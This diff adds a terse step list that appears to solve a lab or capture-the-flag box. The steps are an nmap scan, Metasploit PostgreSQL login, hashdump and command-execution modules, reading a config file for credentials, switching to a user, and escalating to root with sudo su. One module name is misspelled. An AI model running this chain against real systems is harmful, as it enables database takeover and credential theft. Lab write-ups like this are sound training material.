@@ -1,0 +1,12 @@
+1 - nmap -A 10.10.169.84
+2 - msfconsole -> use auxiliary/scanner/postgres/postgres_login
+3 - msfconsole -> use auxiliary/admin/postgres/postgres_sql
+4 - msfconsole -> use auxiliary/scanner/postgres/postgres_hashdump
+5 - msfconsole -> use auxiliary/admin/postgres/posgres_hashdump
+6 - msfconsole -> use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
+7 - cat /var/www/html/config.php
+8 - su alison
+9 - cat /home/alison/user.txt
+10 - sudo -l
+11 - sudo su
+12 - cat /root/root.txt
